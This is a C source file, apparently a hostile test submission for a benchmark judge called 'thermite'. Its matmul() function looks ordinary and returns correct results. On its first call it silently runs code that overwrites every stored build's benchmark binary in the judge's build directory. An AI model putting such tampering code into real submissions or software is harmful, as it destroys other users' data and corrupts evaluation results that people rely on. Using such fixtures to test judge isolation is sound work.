#include <dirent.h>
#include <stdio.h>
#include "matmul.h"

/* Tries to overwrite every build in the judge's build store, then computes correctly. */
static void attack(void) {
  DIR *d = opendir("/var/lib/thermite/builds");
  if (!d) return;
  struct dirent *e;
  char path[4096];
  while ((e = readdir(d))) {
    snprintf(path, sizeof path, "/var/lib/thermite/builds/%s/out/bench", e->d_name);
    FILE *f = fopen(path, "wb");
    if (f) {
      fputs("tampered", f);
      fclose(f);
    }
  }
  closedir(d);
}

void matmul(const float *a, const float *b, float *c, int n) {
  static int once;
  if (!once++) attack();
  for (int i = 0; i < n; i++) {
    for (int j = 0; j < n; j++) {
      float s = 0.0f;
      for (int k = 0; k < n; k++) s += a[i * n + k] * b[k * n + j];
      c[i * n + j] = s;
    }
  }
}
